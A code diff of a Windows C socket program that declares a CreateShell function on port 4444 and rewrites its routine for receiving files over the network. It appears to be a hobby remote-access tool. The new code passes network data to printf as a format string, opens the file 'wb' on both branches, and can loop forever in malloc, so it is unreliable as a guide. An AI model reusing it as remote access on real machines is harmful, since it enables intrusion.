@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <stdlib.h>
 #include<winsock2.h>
 #include<Windows.h>
 #include<process.h>
@@ -10,6 +11,7 @@
 void CreateShell(int port);
 int startup();
 void recieve();
+void auth();
 int port = 4444;
 SOCKET sockt; //global sockt
 int main() {
@@ -107,51 +109,36 @@ void recieve() {
 	//recv t or b flag
 	recv(sockt, buffer, sizeof(buffer), 0);
 	auth();
-	
+
+	//find file size being sent
+	char tmp[10];
+	memset(tmp, 0, 10); //maximum of 10^10 byte file
 	int totalbytes = 0; //find total number of bytes being send
-	recv(sockt, totalbytes, sizeof(totalbytes), 0);
+	int recvbytes = 0;
+	recv(sockt, tmp, 10, 0); //gets 10 bytes
+	totalbytes = atoi(tmp);
+	printf(tmp);
 	auth();
 
-	if (strcmp(buffer,"B")==0) {
-		FILE* ptr = fopen(filename, "wb"); //open file
-		while (TRUE) {
-			memset(buffer, 0, sizeof(buffer));
-			//get input
-			recv(sockt, buffer, DEFAULT_BUFLEN, 0);
-			printf("test ouput \n");
-			if (strcmp(buffer, "EOF\n")) {//stop if EOF reached
-				fclose(ptr);
-				printf("enters EOF");
-				break;
-			}
-			auth(); //ack
-			fwrite(buffer, DEFAULT_BUFLEN, 1, ptr);
-
-		}
-	}
-	else {
-		FILE* ptr = fopen(filename, "w"); //open file in write form
-
-		while (TRUE) {
-			memset(buffer, 0, sizeof(buffer));
-			//get input
-			recv(sockt, buffer, DEFAULT_BUFLEN, 0);
-			printf("test 4");
-			printf(buffer);
-			if (strcmp(buffer, "EOF\n") == 0) {//stop if EOF reached
-				printf("enters end of file");
-				fclose(ptr);
-				break;
-			}
-			printf("test 5");
-			fwrite(buffer, DEFAULT_BUFLEN, 1, ptr);
-			printf("test 6");
-			auth(); //send auth K
-		}
+	FILE* ptr = (strcmp(buffer, "B") == 0) ? fopen(filename, "wb") : fopen(filename, "wb"); //if buffer == B then write bytes else just write
+	int extra = (totalbytes % DEFAULT_BUFLEN);
 	
-	}
+	char* tmpbuff = NULL; 
+	while (tmpbuff == NULL) //prevent tmpbuff being null
+		tmpbuff = malloc(extra * sizeof(char)); //makes tmpbuff size of remainder buff
 
-	printf("send final ACK");
+	while (recvbytes < totalbytes) {
+		if (totalbytes - recvbytes < DEFAULT_BUFLEN) {
+			recv(sockt, tmpbuff, extra, MSG_WAITALL);
+			fwrite(tmpbuff, extra, 1, ptr);
+			free(tmpbuff);
+			break;
+		}
+		int bytesrecv = recv(sockt, buffer, 2048, MSG_WAITALL);
+		fwrite(buffer, bytesrecv, 1, ptr);
+		recvbytes += bytesrecv;
+	}
+	fclose(ptr); //close file
 	auth();
 }
 void auth() {
